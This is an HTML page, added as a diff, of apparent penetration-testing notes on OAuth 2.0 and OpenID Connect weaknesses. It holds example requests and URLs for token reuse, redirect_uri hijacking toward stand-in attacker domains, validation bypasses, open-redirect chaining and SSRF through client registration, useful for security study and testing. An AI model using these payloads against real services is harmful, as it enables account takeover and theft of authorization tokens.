@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Explore OAuth 2.0 authorization framework, its vulnerabilities, and common security flaws in penetration testing. Learn how to identify OAuth flow and prevent attacks.">
+  <title>offsecnotes | OAuth 2.0</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>OAuth 2.0</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#identifying-oauth-authentication" id="toc-identifying-oauth-authentication">Identifying OAuth authentication</a>
+<ul>
+<li><a href="#recon" id="toc-recon">Recon</a></li>
+</ul></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#improper-implementation-of-the-implicit-grant-type" id="toc-improper-implementation-of-the-implicit-grant-type">Improper implementation of the implicit grant type</a></li>
+<li><a href="#account-hijacking-via-redirect_uri" id="toc-account-hijacking-via-redirect_uri">Account hijacking via redirect_uri</a></li>
+<li><a href="#flawed-csrf-protection" id="toc-flawed-csrf-protection">Flawed CSRF protection</a></li>
+</ul></li>
+<li><a href="#openid-connect" id="toc-openid-connect">OpenID Connect</a>
+<ul>
+<li><a href="#identifying-openid-connect" id="toc-identifying-openid-connect">Identifying OpenID Connect</a></li>
+<li><a href="#unprotected-dynamic-client-registration" id="toc-unprotected-dynamic-client-registration">Unprotected dynamic client registration</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+Introduction
+</summary>
+<p><strong>What is OAuth?</strong></p>
+<ul>
+<li>OAuth is a commonly used authorization framework that enables web applications to request limited access to a user’s account on another application.</li>
+</ul>
+<p><strong>How does OAuth 2.0 work?</strong></p>
+<ul>
+<li><strong>Client application</strong> - The website that wants to access the user’s data.</li>
+<li><strong>Resource owner</strong> - The user whose data the client application wants to access.</li>
+<li><strong>OAuth service provider</strong> - The website or application that controls the user’s data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.</li>
+</ul>
+</details>
+<hr />
+<h2 id="identifying-oauth-authentication">Identifying OAuth authentication</h2>
+<ul>
+<li>If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.</li>
+<li>Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the <code>/authorization</code> endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the <code>client_id</code>, <code>redirect_uri</code>, and <code>response_type</code> parameters</li>
+</ul>
+<h3 id="recon">Recon</h3>
+<p>If using an external OAuth service, identify the provider by the hostname in the authorization request. Public API documentation typically provides detailed information, including endpoint names and configuration options. Try sending a request to the following standard endpoints:</p>
+<ul>
+<li><code>/.well-known/oauth-authorization-server</code></li>
+<li><code>/.well-known/openid-configuration</code></li>
+</ul>
+<hr />
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="improper-implementation-of-the-implicit-grant-type">Improper implementation of the implicit grant type</h3>
+<p>At the conclusion of the login process, the client application often sends the username and access token to the server via a <code>POST</code> request. The server then issues a session cookie, effectively completing the login and establishing the user session</p>
+<pre class="http"><code>POST /authenticate HTTP/2
+Host: 0a55005703e1680182bd7f6100b60068.web-security-academy.net
+[..]
+
+{&quot;email&quot;:&quot;lebron@cleveland.com&quot;,&quot;username&quot;:&quot;lebron&quot;,&quot;token&quot;:&quot;ckNqkfxB&quot;}</code></pre>
+<pre class="http"><code>HTTP/2 302 Found
+Location: /
+Set-Cookie: session=OixJC365d0v7yaU1l1xEnCCtfnRZDhZe; Secure; HttpOnly; SameSite=None</code></pre>
+<p>Exploitation: repeat this request with an arbitrary account (changing email and username) and leaving the access token</p>
+<h3 id="account-hijacking-via-redirect_uri">Account hijacking via redirect_uri</h3>
+<p>Replace <code>redirect_uri</code> with a attacker controlled domain</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>https://oauth-x.oauth-server.net/auth?client_id=xyz&amp;redirect_uri=https://attack.com/oauth-callback&amp;response_type=code&amp;scope=openid profile email</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Using <code>state</code> or <code>nonce</code> protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.</p>
+</blockquote>
+<p><strong>Flawed redirect_uri validation</strong></p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>https://default-host.com@foo.evil-user.net</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>https://oauth-xxx-server.com/?client_id=123&amp;redirect_uri=client-app.com/callback&amp;redirect_uri=evil-user.net</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>https://localhost.evil-user.net</span></code></pre></div>
+<p><strong>Chain vulns</strong></p>
+<p>If you are unable to successfully submit an external domain as the <code>redirect_uri</code> you can chain vulnerabilities like open redirect, xss etc.</p>
+<ol type="1">
+<li><p>Find open redirect</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>https://server.net/post/next?path=https://attacker.com</span></code></pre></div></li>
+<li><p>Use this url as <code>redirect_uri</code></p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>https://oauth-xxx-server.com/?client_id=123&amp;redirect_uri=https://server.net/post/next?path=https://attacker.com[...]</span></code></pre></div></li>
+</ol>
+<blockquote>
+<p><strong>Tip</strong>: The default URI will often be on an OAuth-specific path, such as <code>/oauth/callback</code>, so you can use directory traversal tricks <code>https://client-app.com/oauth/callback/../../example/path</code>.</p>
+</blockquote>
+<h3 id="flawed-csrf-protection">Flawed CSRF protection</h3>
+<p>if you notice that the authorization request does not send a <code>state</code> parameter, It potentially means that you can initiate an OAuth flow yourself before tricking a user’s browser into completing it, similar to a traditional CSRF attack.</p>
+<hr />
+<h2 id="openid-connect">OpenID Connect</h2>
+<h3 id="identifying-openid-connect">Identifying OpenID Connect</h3>
+<p>Look for the mandatory <code>openid</code> scope</p>
+<h3 id="unprotected-dynamic-client-registration">Unprotected dynamic client registration</h3>
+<ol type="1">
+<li><p>Identify configuration file <code>/.well-known/openid-configuration</code> to get registration_endpoint</p></li>
+<li><p>Register your own client app. In the logo_uri add a external url for SSRF</p>
+<pre class="http"><code>POST /reg HTTP/1.1
+Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+Content-Type: application/json
+
+{
+    &quot;application_type&quot;: &quot;web&quot;,
+    &quot;client_name&quot;: &quot;My Application&quot;,
+    &quot;redirect_uris&quot;: [
+        &quot;https://client-app.com/callback&quot;,
+        &quot;https://client-app.com/callback2&quot;
+        ],
+    &quot;logo_uri&quot;: &quot;https://BURP-COLLABORATOR-SUBDOMAIN&quot;
+}</code></pre>
+<pre class="http"><code>HTTP/2 201 Created
+[...]
+
+{[...]&quot;client_id&quot;:&quot;aqFGUZgiQmXrUphoMV7i6&quot;,&quot;client_name&quot;:&quot;My Application&quot;,[...]}</code></pre></li>
+<li><p>Make <code>GET /client/CLIENT-ID/logo</code> request and replace the <code>client_id</code></p></li>
+</ol>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
